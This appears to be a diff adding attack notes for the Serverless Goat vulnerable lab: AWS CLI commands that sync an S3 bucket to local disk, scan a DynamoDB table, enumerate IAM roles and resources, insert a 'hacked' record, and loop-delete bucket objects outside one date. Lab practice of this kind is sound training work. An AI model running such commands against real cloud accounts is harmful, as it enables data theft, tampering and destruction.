@@ -1,0 +1,19 @@
+aws s3 ls s3://serverless-goat-bucket-zfvvdstqc4ra
+aws s3 sync s3://serverless-goat-bucket-zfvvdstqc4ra ./"Serverless Goat_PrivEsc"
+
+
+aws dynamodb scan --table-name serverless-goat-Table-I8VT41SY3EKB
+
+
+aws iam list-roles
+aws s3api list-buckets
+aws dynamodb list-tables
+
+
+aws dynamodb put-item --table-name serverless-goat-Table-I8VT41SY3EKB --item '{"id":{"S":"hacked"},"ip":{"S":"1.1.1.1"},"document_url":{"S":"pwned"}}'
+aws dynamodb scan --table-name serverless-goat-Table-I8VT41SY3EKB --filter-expression "id = :val" --expression-attribute-values '{":val":{"S":"hacked"}}'
+
+
+aws s3api list-objects-v2 --bucket serverless-goat-bucket-zfvvdstqc4ra --query 'Contents[?!(LastModified>=`2026-03-25T00:00:00` && LastModified<=`2026-03-25T23:59:59`)].Key' --output text | tr '\t' '\n' | while read key; do
+  aws s3 rm s3://serverless-goat-bucket-zfvvdstqc4ra/"$key"
+done
